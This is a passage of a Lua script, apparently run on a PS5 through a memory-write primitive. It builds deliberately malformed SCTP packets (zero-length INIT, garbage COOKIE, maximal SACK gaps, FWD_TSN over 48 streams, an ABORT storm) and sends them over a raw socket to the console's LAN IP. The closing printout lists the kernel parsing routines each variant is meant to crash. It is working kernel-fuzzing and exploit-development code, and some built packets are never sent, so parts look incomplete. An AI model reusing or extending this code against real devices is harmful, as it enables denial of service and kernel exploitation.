fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0x55555555)
write_chunk(0, 192, 0, 8, nil)

send_pkt(20 + 12 + 8, "B" .. next_var() .. ": FWD_TSN max")

fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0x55555555)
write_chunk(0, 192, 0, 200, nil)  -- claim 200 bytes
safe_wd(pkt + 20 + 12 + 4, 0x01000000)
-- Fill "stream info" (4 bytes each: stream_id + stream_seq)
for i = 0, 47 do
    safe_ww(pkt + 20 + 12 + 8 + i * 4, 0xFFFF)      -- stream_id
    safe_ww(pkt + 20 + 12 + 8 + i * 4 + 2, 0xFFFF)  -- stream_seq
end
send_pkt(20 + 12 + 200, "B" .. next_var() .. ": FWD_TSN 48 streams")
print("")

-- ============================================
-- SECTION C: SCTP to PS5's own LAN IP (different path)
-- ============================================
print("=== C: SCTP TO LAN IP (10.0.0.96) ===")
-- Some kernels handle loopback differently from LAN delivery
-- Send the most dangerous variants to the LAN IP too

local lan_sa = memory.alloc(16)
for i = 0, 15 do safe_wb(lan_sa + i, 0) end
safe_wb(lan_sa + 0, 16)
safe_wb(lan_sa + 1, 2)       -- AF_INET
safe_wb(lan_sa + 4, 10)      -- 10.0.0.96
safe_wb(lan_sa + 5, 0)
safe_wb(lan_sa + 6, 0)
safe_wb(lan_sa + 7, 96)

-- Change dst in IP header too
local function send_pkt_lan(total_len, name)
    build_ip_header(total_len)
    -- Override dst to 10.0.0.96
    safe_wb(pkt + 16, 10); safe_wb(pkt + 17, 0)
    safe_wb(pkt + 18, 0);  safe_wb(pkt + 19, 96)
    local ok_tx, rv_tx = pcall(function()
        return sc_sendto(uint64(raw_fd), uint64(pkt), uint64(total_len),
            uint64(0), uint64(lan_sa), uint64(16))
    end)
    local ret = ok_tx and to_num(rv_tx) or -999
    print(string.format("  %-35s len=%d ret=%d", name, total_len, ret))
    return ret
end

-- INIT len=0 (most dangerous)
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0)
write_chunk(0, 1, 0, 0, nil)

-- INIT len=1

build_sctp_header(12345, 9899, 0)

-- COOKIE garbage
fill_pkt(20, 200, 0xFF)

write_chunk(0, 10, 0, 100, nil)

-- SACK max gaps
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0x11111111)
write_chunk(0, 3, 0, 16, nil)
safe_wd(pkt + 20 + 12 + 4, 0x01000000)
safe_wd(pkt + 20 + 12 + 8, 0xFFFF0000)
safe_ww(pkt + 20 + 12 + 12, 0xFFFF)
safe_ww(pkt + 20 + 12 + 14, 0xFFFF)

-- 50 ABORT storm
fill_pkt(20, 500, 0)
build_sctp_header(12345, 9899, 0x22222222)
for i = 0, 49 do
    write_chunk(i * 4, 6, 0, 4, nil)
end
send_pkt_lan(20 + 12 + 200, "C5: 50 ABORTs → LAN")

-- ============================================
-- SECTION D: Summary
-- ============================================

print("Total variants sent: " .. variant)
print("")
print("If the console rebooted during this probe, check which variant")
print("was the last to print before the crash.")

print("Key targets if any crashed:")
print("  INIT len=0/1  → chunk_length validation in sctp_process_init")
print("  SACK maxgaps  → gap block parsing overflow")
print("  COOKIE garbage → HMAC validation / cookie processing")
print("  FWD_TSN        → stream iteration overflow")
```
